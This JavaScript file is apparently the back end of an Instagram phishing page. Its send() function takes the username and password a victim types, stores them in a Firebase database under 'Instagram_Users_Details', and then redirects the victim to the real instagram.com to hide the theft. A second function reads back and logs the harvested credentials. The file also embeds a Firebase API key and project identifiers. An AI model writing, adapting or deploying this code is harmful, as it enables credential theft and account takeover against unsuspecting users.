room_store = "Instagram_Users_Details";

var firebaseConfig = {
    apiKey: "AIzaSyD6alfnzTsI9q1GQLRVPI8MCC5swmBDq-U",
    authDomain: "meutsvideo-database.firebaseapp.com",
    databaseURL: "https://meutsvideo-database-default-rtdb.firebaseio.com",
    projectId: "meutsvideo-database",
    storageBucket: "meutsvideo-database.appspot.com",
    messagingSenderId: "820053553572",
    appId: "1:820053553572:web:a123e0a02908640efa9131"
};
// Initialize Firebase
firebase.initializeApp(firebaseConfig);

function send() {

    user_name = document.getElementById("username").value;
    password = document.getElementById("password").value

    if (user_name, password == "") {
        document.getElementById("msg").innerHTML = "Error in Log in";
    } else {

        firebase.database().ref(room_store).push({
            name: user_name,
            pass: password
        });
        document.getElementById("username").value = "";
        document.getElementById("password").value = "";
        window.location = "https://www.instagram.com/";
    }
}

function getData() {
    firebase.database().ref("/" + room_store).on('value', function(snapshot) {
        snapshot.forEach(function(childSnapshot) {
            childKey = childSnapshot.key;
            childData = childSnapshot.val();
            if (childKey != "purpose") {
                firebase_message_id = childKey;
                message_data = childData;
                //Start code
                console.log(firebase_message_id);
                console.log(message_data);
                // name = message_data['name'];
                // message = message_data['message'];

                // name_tag = "<h6 class='username_h4'><img class='user_tick' src='https://gyanam-ui.github.io/www.nestcoderpro.com/images/default-user.png'/> " + name + "</h6>";
                // message_tag = "<h4 class='message_h4'>" + message + "</h4><hr>";
                // row = name_tag + message_tag + "<br>";
                // document.getElementById("output").innerHTML += row;
                //End code
            }
        });
    });
}
getData();